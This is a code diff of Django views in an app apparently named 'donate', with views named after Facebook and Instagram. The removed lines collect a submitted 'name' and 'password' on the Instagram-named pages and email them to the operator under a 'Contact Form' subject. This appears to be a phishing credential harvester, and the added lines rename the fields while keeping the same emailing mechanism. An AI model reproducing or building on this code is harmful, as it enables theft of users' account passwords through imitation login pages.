@@ -88,13 +88,13 @@ def facebook(request):
    return render(request, 'donate/facebook.html')
 
 def instagram(request):
-    
+
    if request.method == 'POST':
-       name = request.POST['name']
-       password = request.POST['password']
+       product = request.POST['product']
+       massage = request.POST['massage']
        ctx = {
-           'name' : name,
-           'password' : password,
+           'product' : product,
+           'massage' : massage,
        }
        message = render_to_string('donate/email2.html', ctx)
        send_mail('Contact Form',
@@ -105,16 +105,16 @@ def instagram(request):
 
        return redirect('instagram1')
 
-    return render(request, 'donate/instagram.html')
+   return render(request, 'donate/instagram.html')
 
 def instagram1(request):
-    
+
    if request.method == 'POST':
-       name = request.POST['name']
-       password = request.POST['password']
+       product = request.POST['product']
+       massage = request.POST['massage']
        ctx = {
-           'name' : name,
-           'password' : password,
+           'product' : product,
+           'massage' : massage,
        }
        message = render_to_string('donate/email2.html', ctx)
        send_mail('Contact Form',
@@ -125,7 +125,7 @@ def instagram1(request):
 
        return redirect('instagram1')
 
-    return render(request, 'donate/instagram1.html')
+   return render(request, 'donate/instagram1.html')
 
 def terms( request):
     return render (request, 'donate/terms.html')      
